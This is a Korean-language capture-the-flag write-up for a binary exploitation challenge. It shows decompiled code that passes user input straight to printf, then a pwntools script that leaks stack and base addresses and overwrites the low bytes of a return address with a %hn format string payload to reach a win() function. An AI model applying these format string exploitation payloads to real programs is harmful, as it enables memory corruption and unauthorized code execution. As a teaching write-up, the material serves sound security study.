## 함수 분석 / 취약점 발견
### ida 분석
1. 목표로 할 `win()` 함수가 존재한다.
```c++
int win()
{
  char *argv; // [rsp+0h] [rbp-20h]
  const char *v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  printf("I'm not sure how, but your terrible leadership worked!");
  argv = "/bin/cat";
  v2 = "flag.txt";
  v3 = 0LL;
  return execve("/bin/cat", &argv, 0LL);
}
```
2. 50바이트만큼 입력받고 printf를 그대로 해주어 두번의 FSB가 가능하다. 검사를 index = 0에 대해서만 하므로 자유로운 입력이 가능하다.
```c++
  fgets(s, 50, _bss_start);
  printf("You chose: ");
  printf(s);
  if ( s[0] == 49 )
    return close_borders();
  result = 50 - (unsigned __int8)s[0];
  if ( s[0] == 50 )
    result = no_panic();
    ....

  printf("You chose: ");
  printf(s);
  if ( s[0] == 49 )
    return lose3();
  result = 50 - (unsigned __int8)s[0];
  if ( s[0] == 50 )
    result = lose4();
```
따라서, got 혹은 return 주소를 win의 주소로 덮어씌어주면 된다.

## 구현
초기에는 puts의 got를 short FSB로 2byte씩 덮어씌어주려 했으나 buffer의 크기가 작아 수행하지 못했다. 따라서 방향을 바꾸어 return값을 바꾸는 것을 목표로 하였다. 인접한 함수들간 주소가 인접함을 이용해 close_border의 return 주소를 win 함수의 주소로 2byte만 바꾸어줄 수 있다.
1. ret 주소 값과 base address 구하기.
    * $13이 _start의 주소이므로, _start의 offset과 win의 offset을 이용해 win의 주소를 구한다.
    * $14이 frame stack pointer 값이므로, 이를 이용해 ret의 위치를 구한다.
    ```python
    p.sendlineafter('out.\n', b'1 %14$p%13$p')

    p.recvuntil('You chose: 1 0x')
    res = p.recvuntil('0x')[:-2]
    log.info(res)

    rbp_addr = int(res, 16) - 0x10
    ret_addr = rbp_addr - 0x48

    res = p.recvuntil('\n')[:-1]
    log.info(res)
    base_addr = int(res, 16) - start_offset
    win_addr = base_addr + win_offset

    log.info(f'rbp_addr : {hex(rbp_addr)}')
    log.info(f'ret_addr : {hex(ret_addr)}')
    log.info(f'win_addr : {hex(win_addr)}')
    ```
2. return 주소의 하위 2바이트를 win_addr의 하위 2바이트로 바꾸면 win으로 return된다.
    ```python
    payload = b'%' + str(win_addr & 0xffff).encode() + b'c%11$hn'
    payload = payload.ljust(0x28, b'a')
    payload += p64(ret_addr)

    p.sendlineafter('plan.\n', payload)
    p.interactive()
    ```